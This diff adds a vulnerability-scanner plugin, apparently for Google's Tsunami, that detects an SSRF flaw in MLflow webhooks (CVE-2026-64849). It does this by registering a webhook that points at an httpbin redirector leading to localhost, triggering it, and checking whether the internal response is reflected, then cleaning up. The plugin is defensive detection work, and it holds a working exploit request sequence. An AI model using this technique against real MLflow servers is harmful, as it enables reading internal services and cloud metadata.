@@ -1,0 +1,124 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MLflow_CVE_2026_64849"
+  author: "mangeshwalsane2-hash"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-64849"
+  }
+  severity: HIGH
+  title: "Server-Side Request Forgery affecting MLflow Webhooks (CVE-2026-64849)"
+  description: "Vulnerable MLflow versions are susceptible to Server-Side Request Forgery (SSRF) in the webhook delivery mechanism via unvalidated HTTP redirects. An unauthenticated attacker can create a webhook pointing to an external redirector leading to internal endpoints (such as localhost or cloud metadata services) and trigger test execution to read internal responses directly from the response body."
+  recommendation: "Update MLflow to version 3.16.0 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-64849"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_mlflow"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>MLflow</title>" }
+        ]
+      }
+    }
+  }
+}
+
+# -------------------------------------------------------------
+# Reflective In-Band Check
+# -------------------------------------------------------------
+actions: {
+  name: "create_webhook"
+  http_request: {
+    method: POST
+    uri: "/api/2.0/mlflow/webhooks"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"{{ webhook_name }}\",\"url\":\"https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A5000%2Fapi%2F2.0%2Fmlflow%2Fexperiments%2Flist\",\"events\":[{\"entity\":\"REGISTERED_MODEL\",\"action\":\"CREATED\"}]}"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"webhook_id\":\\s*\"([a-zA-Z0-9_-]+)\""
+            variable_name: "webhook_id"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_webhook_and_verify_reflection"
+  http_request: {
+    method: POST
+    uri: "/api/2.0/mlflow/webhooks/{{ webhook_id }}/test"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"webhook_id\":\"{{ webhook_id }}\",\"event\":{\"entity\":\"REGISTERED_MODEL\",\"action\":\"CREATED\"}}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"response_body\":" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "cleanup_webhook"
+  http_request: {
+    method: DELETE
+    uri: "/api/2.0/mlflow/webhooks/{{ webhook_id }}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "webhook_name" value: "tsunami-refl-{{ T_UTL_CURRENT_TIMESTAMP_MS }}" }
+  ]
+  actions: [
+    "fingerprint_mlflow",
+    "create_webhook",
+    "trigger_webhook_and_verify_reflection",
+    "cleanup_webhook"
+  ]
+}
